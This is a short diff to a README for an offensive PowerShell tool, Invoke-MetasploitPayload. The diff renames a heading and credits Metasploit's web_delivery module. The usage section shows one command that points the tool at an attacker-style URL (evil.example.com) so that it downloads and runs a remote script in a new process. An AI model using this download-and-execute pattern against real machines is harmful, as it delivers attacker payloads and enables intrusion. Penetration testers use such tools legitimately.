@@ -37,10 +37,14 @@ After running the web_delivery module, it will print out the URL for the webserv
 
 ![Web Delivery Example](/web_delivery_screenshot.png)
 
-#### Using Invoke-Metasploit.ps1
+#### Using Invoke-MetasploitPayload.ps1
 
 Usage is simple, just pass the URL from the web_delivery module. Invoke-MetasploitPayload will handle spinning up a new process and then downloading and executing the script.
 
 ```
 PS> Invoke-MetasploitPayload -url "http://evil.example.com/SDFJLWKS"
 ```
+
+#### Acknowledgements
+
+Invoke-MetasploitPayload is really just a repackaging of the PowerShell commands provided by the [web_delivery module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/script/web_delivery.rb) to download and execute the script. My hats off to those authors for their hard work.
